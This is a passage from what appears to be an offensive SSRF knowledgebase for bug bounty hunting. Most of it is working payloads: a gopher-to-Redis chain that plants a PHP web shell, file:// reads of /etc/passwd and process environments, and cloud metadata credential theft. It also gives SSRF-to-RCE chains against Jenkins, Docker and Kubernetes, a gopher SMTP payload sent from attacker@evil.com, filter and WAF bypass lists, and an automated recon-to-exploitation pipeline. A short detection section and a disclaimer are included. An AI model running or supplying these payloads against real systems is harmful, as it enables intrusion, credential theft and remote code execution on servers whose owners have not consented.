gopher://127.0.0.1:25/_HELO%20localhost%0D%0AMAIL%20FROM:%3Cattacker@evil.com%3E%0D%0ARCPT%20TO:%3Cvictim@target.com%3E%0D%0ADATA%0D%0AFrom:%20attacker@evil.com%0D%0ATo:%20victim@target.com%0D%0ASubject:%20Test%0D%0A%0D%0ATest%20message%0D%0A.%0D%0AQUIT%0D%0A
```

**Gopher → Internal API:**
```
gopher://127.0.0.1:8080/_POST%20/api/internal%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0AContent-Type:%20application/json%0D%0AContent-Length:%2015%0D%0A%0D%0A%7B%22cmd%22:%22whoami%22%7D
```

### file:// Payloads

The `file` protocol reads local files. Often enabled by default in URL fetchers.

```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/fd/0
file:///proc/self/fd/1
file:///proc/self/fd/2
file:///var/log/apache2/access.log
file:///var/www/html/config.php
file:///windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
```

**Note:** `file://` may be blocked, but `file:///` (three slashes) or `file://localhost/` might work.

### dict:// Payloads

The `dict` protocol queries dictionary servers. Can be used for port scanning and service interaction.

```
dict://127.0.0.1:6379/info          # Redis info via dict
dict://127.0.0.1:11211/stats       # Memcached stats
dict://127.0.0.1:3306/             # MySQL (may error but reveals service)
```

### ftp:// Payloads

```
ftp://127.0.0.1:21/
ftp://anonymous:anonymous@127.0.0.1/
```

### ldap:// / ldaps:// Payloads

```
ldap://127.0.0.1:389/
ldap://127.0.0.1:389/dc=example,dc=com
```

---

## Redis Exploitation Chains

### SSRF to Redis via gopher

Redis accepts commands over plain TCP. Using gopher:// to send raw Redis commands:

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ASAVE%0D%0A
```

**URL-decoded payload:**
```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']);?>"
SAVE
```

### SSRF to Redis via HTTP (if Webdis or similar is running)

```
http://127.0.0.1:7379/CONFIG/SET/dir/%2fvar%2fwww%2fhtml
http://127.0.0.1:7379/CONFIG/SET/dbfilename/shell.php
http://127.0.0.1:7379/SET/x/%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E
http://127.0.0.1:7379/SAVE
```

### Redis SSRF via dict://

```
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
```

---

## Browser Quirks

### URL Parsing Differences

**Chrome / Firefox (WHATWG URL Standard):**
- Normalizes `\` to `/`
- Strips tabs and newlines from URL
- IDNA/punycode normalization
- IPv6 brackets required

**cURL / libcurl:**
- Accepts `\` as `/` on Windows
- Different IDNA handling
- IPv6 brackets optional in some versions

**Java `java.net.URL`:**
- Does not normalize `\` to `/`
- Different authority parsing
- IPv6 brackets required

**PHP `parse_url`:**
- Known bugs with `///` and `////` prefixes
- Different handling of relative URLs

### Browser-Specific SSRF Vectors

**1. Fetch API with mode: no-cors:**
```javascript
fetch("http://169.254.169.254/", {mode: "no-cors"})
```

**2. Image Tag SSRF (Client-Side):**
```html
<img src="http://169.254.169.254/latest/meta-data/">
```

**3. JavaScript Redirect:**
```javascript
window.location = "http://169.254.169.254/"
```

**4. WebSocket to Internal:**
```javascript
new WebSocket("ws://127.0.0.1:8080/")
```

### The `0` Host Quirk

Some parsers interpret `0` as `0.0.0.0`:
```
http://0 → http://0.0.0.0
http://0:8080 → http://0.0.0.0:8080
```

### The `127.0.0.1.1` Quirk

Some resolvers treat `127.0.0.1.1` as `127.0.0.1` (ignoring trailing octets):
```
http://127.0.0.1.1
```

---

## Gadget Chains

### SSRF as a Gadget for Other Vulnerabilities

**1. SSRF → RCE via Jenkins:**
```
http://127.0.0.1:8080/script
# POST body: script="println 'whoami'.execute().text"
```

**2. SSRF → RCE via Solr:**
```
http://127.0.0.1:8983/solr/admin/cores?action=CREATE&name=evil&config=solrconfig.xml&dataDir=../../../../tmp&wt=json
```

**3. SSRF → RCE via Apache Spark:**
```
http://127.0.0.1:4040/jobs/
# Or submit job via REST API
```

**4. SSRF → Data Exfil via Elasticsearch:**
```
http://127.0.0.1:9200/_search?source={"query":{"match_all":{}}}
```

**5. SSRF → Kubernetes API Access:**
```
http://127.0.0.1:6443/api/v1/namespaces/default/pods
http://127.0.0.1:6443/api/v1/namespaces/default/secrets
```

**6. SSRF → Docker API RCE:**
```
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/containers/create
http://127.0.0.1:2375/containers/ID/start
```

**7. SSRF → AWS Console Access:**
```
# After stealing credentials via metadata
https://signin.aws.amazon.com/federation?Action=login
```

---

## Real World Case Studies

### Capital One Breach (2019)

**Vulnerability:** SSRF in a WAF (ModSecurity) running on EC2  
**Exploitation Chain:**
1. SSRF to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. Retrieved IAM role credentials
3. Used credentials to access S3 buckets
4. Exfiltrated 100 million customer records

**Key Lesson:** IMDSv1 + overprivileged IAM role = catastrophic. The attacker used a simple SSRF payload against the metadata endpoint.

### SSRF in WAFs

WAFs themselves can be SSRF vectors if they fetch remote resources for inspection:
- URL categorization services
- Remote file inclusion checks
- SSL certificate validation that fetches OCSP/CRL URLs

### SSRF via PDF Generators

Many PDF libraries (wkhtmltopdf, Puppeteer, WeasyPrint) fetch external resources:
```html
<!-- Injected into PDF generation -->
<img src="http://169.254.169.254/latest/meta-data/">
<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
```

### SSRF in Image Processing

ImageMagick, GraphicsMagick, and similar tools process URLs in image metadata:
```
# MVG (Magick Vector Graphics) format:
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/)'
pop graphic-context
```

---

## Fuzzing Payloads

### Comprehensive SSRF Payload List

```
# Basic localhost variants
http://127.0.0.1
http://127.1
http://127.0.1
http://localhost
http://0.0.0.0
http://0
http://[::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:0:0:1]

# Decimal IPs
http://2130706433
http://3232235521
http://3232235777
http://2886729728
http://167772673
http://2852039166

# Octal IPs
http://0177.0.0.1
http://0177.1
http://0300.0250.0371.0356

# Hex IPs
http://0x7f.0.0.1
http://0x7f000001
http://0x7f.1
http://0xa9fea9fe

# Mixed
http://0x7f.0.0.0x1
http://0177.0.0.0x1

# DNS tricks
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://1.0.0.127.in-addr.arpa

# @ tricks
http://evil.com@127.0.0.1
http://evil.com:80@127.0.0.1
http://evil.com@127.0.0.1:80
http://127.0.0.1?evil.com
http://127.0.0.1#evil.com

# Whitelist bypasses
http://allowed.com.127.0.0.1.nip.io
http://allowed.com@127.0.0.1
http://127.0.0.1/allowed.com

# Cloud metadata
http://169.254.169.254
http://169.254.169.254.nip.io
http://2852039166
http://0xa9fea9fe
http://[::ffff:169.254.169.254]
http://169.254.170.2
http://100.100.100.200
http://192.0.0.192

# Protocol variants
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
ftp://anonymous:anonymous@127.0.0.1/
ldap://127.0.0.1:389/

# URL-encoded variants
http://127.0.0.%31
http://127.%30.0.1
http://%31%32%37%2e%30%2e%30%2e%31

# Unicode / IDN
http://localhost。com
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ

# Path traversal
http://trusted.com/../../internal
http://trusted.com/..%2f..%2finternal

# SSRF via redirect (host on your server)
http://your-server.com/redirect-to-127.0.0.1
```

---

## Automation Workflows

### Recon → Detection → Exploitation Pipeline

```bash
# PHASE 1: RECON
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt

# 2. Probe alive hosts
httpx -l subs.txt -o alive.txt

# 3. Crawl for URL parameters
katana -list alive.txt -d 5 -o endpoints.txt

# 4. Extract URL-related parameters
cat endpoints.txt | grep -iE "(url|uri|path|dest|redirect|callback|next|return|to|out|view|window|data|reference|site|html|val|validate|domain|feed|host|port|dir|continue)=" > url_params.txt

# PHASE 2: SSRF DETECTION
# 1. Start interactsh
interactsh-client -ps -psf payloads.txt

# 2. Fuzz with OOB payloads
ffuf -u "https://target.com/FUZZ" \
     -w url_params.txt \
     -mode clusterbomb \
     -mc all

# Or use nuclei
nuclei -l alive.txt -t http/vulnerabilities/ssrf/ -o ssrf_findings.txt

# PHASE 3: EXPLOITATION
# 1. For confirmed SSRF, test localhost bypasses
# 2. Test cloud metadata endpoints
# 3. Test internal port scanning
# 4. Test protocol smuggling (gopher, file, dict)

# PHASE 4: NOTIFICATION
# Pipe findings to notify
nuclei -l alive.txt -t ssrf/ | notify -bulk
```

### Blind SSRF Automation with Interactsh

```bash
# Generate payloads
interactsh-client -n 100 -ps -psf ssrf_payloads.txt

# Use with ffuf
ffuf -u "https://target.com/api?url=FUZZ" \
     -w ssrf_payloads.txt \
     -t 50 \
     -mc all

# Poll interactions
interactsh-client -sf interact.session
```

### Continuous Monitoring

```bash
# Cron job for continuous SSRF monitoring
0 */6 * * * /usr/local/bin/nuclei -l targets.txt -t ssrf/ -o /var/log/ssrf_scan.jsonl && cat /var/log/ssrf_scan.jsonl | notify -bulk
```

---

## Recon Methodology

### Manual Recon Workflow

**Step 1: Identify URL Sinks**
- Look for features that fetch remote content:
  - Image proxies (`?url=`, `?img=`)
  - Webhook settings
  - URL preview / unfurling
  - PDF generation
  - File upload via URL
  - RSS feed readers
  - API integrations

**Step 2: Test for Basic SSRF**
```
?url=http://your-oast-domain.oast.pro
?url=http://your-burp-collaborator.net
```

**Step 3: Confirm with DNS + HTTP**
- DNS interaction = at least hostname resolution
- HTTP interaction = full HTTP request possible

**Step 4: Escalate to Localhost**
```
?url=http://127.0.0.1
?url=http://localhost
?url=http://0
```

**Step 5: Escalate to Cloud Metadata**
```
?url=http://169.254.169.254/latest/meta-data/
```

**Step 6: Escalate to Internal Scanning**
```
?url=http://127.0.0.1:22    # SSH
?url=http://127.0.0.1:3306  # MySQL
?url=http://127.0.0.1:6379  # Redis
```

**Step 7: Test Protocol Smuggling**
```
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info
?url=gopher://127.0.0.1:6379/_INFO
```

### Parameter Discovery

**Using Param Miner (Burp Suite):**
```
# Install Param Miner extension
# Right-click request → Guess params → Guess GET parameters
# Look for URL-related parameters that aren't normally visible
```

**Common Hidden SSRF Parameters:**
```
?__proto__.url=
?constructor.prototype.url=
?constructor[url]=
?url[0]=
?url[]=
?source=
?endpoint=
?target=
?remote=
?fetch=
?proxy=
?forward=
?origin=
?referer=
```

### Header-Based SSRF

**X-Forwarded-Host Injection:**
```
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Host: 169.254.169.254
```

**X-Original-URL / X-Rewrite-URL:**
```
GET / HTTP/1.1
Host: target.com
X-Original-URL: http://169.254.169.254/latest/meta-data/
```

**Host Header SSRF:**
```
GET / HTTP/1.1
Host: 169.254.169.254
```

---

## Nuclei Templates

### Running SSRF Templates

```bash
# All SSRF templates
nuclei -u https://target.com -t http/vulnerabilities/ssrf/

# Specific templates
nuclei -u https://target.com -t http/vulnerabilities/ssrf/ssrf-parameter.yaml
nuclei -u https://target.com -t http/vulnerabilities/ssrf/aws-metadata.yaml
nuclei -u https://target.com -t http/vulnerabilities/ssrf/blind-ssrf.yaml

# With interactsh for blind SSRF
nuclei -u https://target.com -t http/vulnerabilities/ssrf/ -iserver oast.pro

# Cloud metadata specific
nuclei -u https://target.com -t http/vulnerabilities/ssrf/aws-ec2-metadata.yaml
nuclei -u https://target.com -t http/vulnerabilities/ssrf/gcp-metadata.yaml
nuclei -u https://target.com -t http/vulnerabilities/ssrf/azure-metadata.yaml
```

### Custom Nuclei Template Logic

**Basic SSRF Detection Template:**
```yaml
id: custom-ssrf-detection

info:
  name: Custom SSRF Detection
  author: you
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/fetch?url={{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
```

**Cloud Metadata Template:**
```yaml
id: aws-metadata-ssrf

info:
  name: AWS Metadata SSRF
  author: you
  severity: critical

requests:
  - method: GET
    path:
      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

    matchers:
      - type: word
        words:
          - "AccessKeyId"
          - "SecretAccessKey"
          - "Token"
        condition: or
```

---

## Tools and Scanners

### SSRFmap

```bash
# Install
pip install ssrfmap

# Basic usage
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Modules
-m readfiles     # Read local files
-m portscan      # Port scanning
-m aws           # AWS metadata extraction
-m redis         # Redis exploitation
-m mysql         # MySQL exploitation
-m smtp          # SMTP exploitation
-m dns           # DNS exfiltration
```

### SSRFmap (Swissky)

```bash
# Clone and run
git clone https://github.com/swisskyrepo/SSRFmap
python3 ssrfmap.py -r request.txt -p url -m all
```

### Blind-SSRF-Chains (Assetnote)

```bash
# Collection of blind SSRF exploitation chains
git clone https://github.com/assetnote/blind-ssrf-chains
# Use the documented chains for specific services (Slack, Discord, etc.)
```

### Param Miner (Burp Suite)

```
# Install from BApp Store
# Use to find hidden URL parameters that may be SSRF sinks
```

### HTTP Request Smuggler (Burp Suite)

```
# Install from BApp Store
# Use to find desync vectors that can chain with SSRF
```

### smuggler (defparam)

```bash
# Standalone smuggling detector
python3 smuggler.py -u https://target.com
```

### httpx (ProjectDiscovery)

```bash
# Fast multi-purpose HTTP toolkit
httpx -l targets.txt -path /api/fetch?url=http://169.254.169.254 -mc all

# Technology detection + SSRF probe
httpx -l targets.txt -td -path /proxy?url=http://127.0.0.1
```

### interactsh (ProjectDiscovery)

```bash
# OOB interaction gathering
interactsh-client

# With verbose output
interactsh-client -v -o logs.txt

# Self-hosted server
interactsh-client -server your-server.com
```

### notify (ProjectDiscovery)

```bash
# Stream tool output to notifications
nuclei -l targets.txt -t ssrf/ | notify -bulk -provider discord,slack
```

### katana (ProjectDiscovery)

```bash
# Web crawler for endpoint discovery
katana -u https://target.com -d 5 -o endpoints.txt
```

### subfinder + dnsx

```bash
# Subdomain enumeration
subfinder -d target.com | dnsx -o subs.txt
```

### cariddi

```bash
# Crawl and search for sensitive info
cariddi -url https://target.com
```

### CursedChrome

```bash
# Chrome extension for pivoting through compromised browser
git clone https://github.com/mandatoryprogrammer/CursedChrome
```

---

## Advanced Research

### Cracking the Lens (PortSwigger Research)

James Kettle's research on targeting HTTPS hidden attack surfaces:
- CDN frontends that proxy to backend origins
- Host header injection through CDNs
- Using SSRF to discover internal origin IPs behind CDNs
- Cloudflare/AWS CloudFront origin IP discovery

**Key Technique:**
```
# If a CDN forwards based on Host header, SSRF the Host header
Host: 169.254.169.254
```

### HTTP Desync Attacks: Request Smuggling Reborn

- CL.TE and TE.CL desync vectors
- Differential responses to detect desync
- Chaining desync with SSRF to hit internal services

### Browser-Powered Desync Attacks

- Using JavaScript to desync browser connections
- Cross-user desync via connection pool poisoning
- Desync to SSRF internal APIs

### Practical Web Cache Poisoning

- Unkeyed inputs that reach SSRF sinks
- Cache key normalization differences
- Poisoning cache to SSRF other users

### Web Cache Entanglement

- Multiple URLs sharing cache keys
- Normalization differences between cache and origin
- Using SSRF to pollute cache entries

### Hidden OAuth Attack Vectors

- Dynamic client registration SSRF
- JWKS URI SSRF
- Request URI SSRF (PAR)
- Backchannel logout URI SSRF
- SAML assertion SSRF

---

## Bug Bounty Writeups

### Common SSRF Bug Bounty Patterns

**1. Image Proxy SSRF:**
```
GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com
```

**2. PDF Generation SSRF:**
```
POST /generate-pdf HTTP/1.1
Host: target.com
Content-Type: application/json

{"html": "<img src='http://169.254.169.254/latest/meta-data/'>"}
```

**3. Webhook SSRF:**
```
POST /webhooks HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

**4. URL Preview SSRF:**
```
GET /preview?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

**5. File Upload via URL:**
```
POST /upload HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

### Writeup Resources

- HackerOne SSRF reports (search: "SSRF site:hackerone.com")
- Bugcrowd SSRF writeups
- Medium: "Advanced SSRF exploitation guide"
- Medium: "Advanced SSRF and URL parser confusion techniques"

---

## Payload Collections

### Swissky — PayloadsAllTheThings SSRF

Complete payload collection organized by bypass type:
- Localhost bypasses
- Cloud metadata endpoints
- Protocol smuggling
- URL encoding tricks
- DNS rebinding

### PayloadBox — SSRF Payloads

Dedicated SSRF payload repository with:
- Categorized by target (AWS, GCP, Azure, Kubernetes)
- Protocol-specific payloads
- WAF bypass variants

### Assetnote — Blind SSRF Chains

Documented chains for exploiting blind SSRF against:
- Slack webhooks
- Discord webhooks
- Microsoft Teams
- Internal APIs
- Cloud services

### 0xspade — Bug Bounty SSRF

Bug bounty specific SSRF notes and payloads.

---

## WAF Bypasses

### Common WAF Rules and Bypasses

**Rule: Block `169.254.169.254`:**
```
# Bypass: Alternative representations
http://2852039166                # decimal
http://0xa9fea9fe                # hex
http://[::ffff:169.254.169.254]  # IPv6 mapped
http://169.254.169.254.nip.io    # DNS alias
```

**Rule: Block `localhost`:**
```
http://127.1
http://127.0.1
http://0
http://[::1]
http://2130706433
http://0177.1
```

**Rule: Block private IP ranges:**
```
# Use DNS rebinding
# Use public redirect services
# Use @ trick with whitelisted domain
```

**Rule: Block `file://`:**
```
file://localhost/etc/passwd
file://///etc/passwd
file://%2fetc%2fpasswd
```

**Rule: Block `gopher://`:**
```
gopher%3a//127.0.0.1:6379
Gopher://127.0.0.1:6379        # Case variation
```

### Cloudflare Bypass Techniques

```
# Cloudflare may block direct IPs but not DNS aliases
http://127.0.0.1.nip.io
http://169.254.169.254.nip.io

# Use redirect chains
http://your-server.com/redirect?to=http://169.254.169.254
```

---

## Detection Techniques

### SAST Detection

**Semgrep Rule:**
```yaml
rules:
  - id: ssrf-user-controlled-url
    patterns:
      - pattern: requests.get($URL, ...)
      - pattern-not: requests.get("...", ...)
    message: "Potential SSRF: URL may be user-controlled"
    severity: WARNING
    languages: [python]
```

**CodeQL:**
- Track taint from `request.getParameter()` to `URL.openConnection()`
- Track taint from `req.query` to `fetch()`

### DAST Detection

**Using Burp Suite:**
1. Replace URL parameters with Burp Collaborator payloads
2. Check Collaborator for DNS/HTTP interactions
3. Use Intruder for port scanning via time-based detection

**Using Nuclei:**
```bash
nuclei -u https://target.com -t http/vulnerabilities/ssrf/
```

### Runtime Detection

**AWS CloudTrail:**
- Monitor for `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`
- Alert on metadata endpoint access from unexpected sources

**Azure Security Center:**
- Monitor for managed identity token usage from unexpected IPs
- Alert on IMDS access patterns

**GCP Audit Logs:**
- Monitor for metadata service access anomalies

### Network-Level Detection

```bash
# Monitor for outbound requests to 169.254.169.254 from app servers
# This should NEVER happen from user-facing applications

# iptables rule to log metadata access
iptables -A OUTPUT -d 169.254.169.254 -j LOG --log-prefix "METADATA_ACCESS: "
```

---

## References

### PortSwigger Web Security Academy
- https://portswigger.net/web-security/ssrf
- https://portswigger.net/web-security/ssrf/blind
- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

### PortSwigger Research
- https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- https://portswigger.net/research/browser-powered-desync-attacks
- https://portswigger.net/research/practical-web-cache-poisoning
- https://portswigger.net/research/web-cache-entanglement
- https://portswigger.net/research/hidden-oauth-attack-vectors

### GitHub Repositories
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- https://github.com/assetnote/blind-ssrf-chains
- https://github.com/assetnote/ssrfmap
- https://github.com/swisskyrepo/SSRFmap
- https://github.com/payloadbox/ssrf-payloads
- https://github.com/0xspade/bugbounty/tree/master/ssrf
- https://github.com/PortSwigger/param-miner
- https://github.com/PortSwigger/http-request-smuggler
- https://github.com/defparam/smuggler
- https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/ssrf
- https://github.com/projectdiscovery/nuclei
- https://github.com/projectdiscovery/httpx
- https://github.com/projectdiscovery/interactsh
- https://github.com/projectdiscovery/notify
- https://github.com/projectdiscovery/katana
- https://github.com/projectdiscovery/subfinder
- https://github.com/edoardottt/cariddi
- https://github.com/lutfumertceylan/top25-parameter
- https://github.com/danielmiessler/SecLists
- https://github.com/BlackFan/client-side-prototype-pollution
- https://github.com/fransr/postMessage-tracker
- https://github.com/yeswehack/pp-finder

### Documentation
- https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host
- https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API

### Writeups & Articles
- https://infosecwriteups.com/advanced-ssrf-exploitation-guide-7e4d2f5c3b1a
- https://medium.com/@filedescriptor/advanced-ssrf-and-url-parser-confusion-techniques-2f4d7c1b5e3d
- https://medium.com/@abhinavsharma.cyber/the-phantom-pivot-advanced-red-teaming-through-ssrf-dns-rebinding-by-abhinav-sharma-8b4238f4225f
- https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft
- https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials
- https://guardz.com/blog/exploiting-azure-managed-identity-tokens-from-imds/
- https://www.binarysecurity.no/posts/2025/01/finding-ssrfs-in-devops

### Tools
- **Burp Suite** — Web app testing platform
- **Nuclei** — Fast vulnerability scanner
- **Interactsh** — OOB interaction gathering
- **SSRFmap** — Automated SSRF exploitation
- **Param Miner** — Hidden parameter discovery
- **HTTP Request Smuggler** — Desync detection
- **smuggler** — Standalone smuggling detector
- **httpx** — Fast HTTP prober
- **katana** — Web crawler
- **subfinder** — Subdomain discovery
- **cariddi** — Sensitive data crawler

---

> **Disclaimer:** This knowledgebase is for authorized security testing, bug bounty hunting, and educational purposes only. Always ensure you have explicit permission before testing any system.
